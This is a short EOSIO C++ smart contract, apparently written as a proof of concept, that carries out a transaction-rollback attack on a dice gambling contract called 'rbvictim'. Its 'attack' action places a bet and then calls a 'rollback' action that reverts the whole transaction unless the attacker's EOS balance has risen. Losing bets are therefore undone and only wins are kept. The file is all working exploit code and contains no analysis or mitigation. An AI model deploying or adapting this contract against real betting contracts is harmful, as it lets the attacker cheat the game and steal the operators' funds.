#include <eosio/eosio.hpp>
#include <eosio/multi_index.hpp>
#include <eosio/contract.hpp>
#include <eosio/asset.hpp>
#include <eosio/symbol.hpp>
#include <eosio/transaction.hpp>
#include <eosio/serialize.hpp>
#include <eosio/time.hpp>

using namespace eosio;

class [[eosio::contract("atkrb")]] atkrb : public eosio::contract {
  public:
    using eosio::contract::contract;
    atkrb(name receiver, name code, datastream<const char *> ds)
    : contract(receiver, code, ds) {};

    struct accounts {
        asset balance;
        uint64_t primary_key() const {
            return balance.symbol.code().raw();
        }
    };
    typedef eosio::multi_index<name("accounts"), accounts> accounts_table;

    [[eosio::action]]
    void rollback(asset in) {
        require_auth(_self);
        accounts_table balance(name("eosio.token"), name("rbatk").value);
        symbol TOKEN_SYMBOL = symbol("EOS", 4);
        auto itr = balance.find(TOKEN_SYMBOL.code().raw());
        if (itr != balance.end()) {
            print("current balance is: ", itr->balance, "\n");
        }

        check(in.amount < itr->balance.amount, "rollback");
    }


    [[eosio::action]]
    void attack(asset bet) {
        require_auth(get_self());
        accounts_table balance(name("eosio.token"), name("rbatk").value);
        symbol TOKEN_SYMBOL = symbol("EOS", 4);
        auto itr = balance.find(TOKEN_SYMBOL.code().raw());
        if (itr != balance.end()) {
            print("current balance is: ", itr->balance, "\n");
        }

        std::string memo = "dice-3";
        action(
            permission_level(_self, name("active")),
            name("eosio.token"),
            name("transfer"),
            std::make_tuple(_self, name("rbvictim"), bet, memo)
        ).send();

        action(
            permission_level(_self, name("active")),
            _self,
            name("rollback"),
            std::make_tuple(itr->balance)
        ).send();
    }
};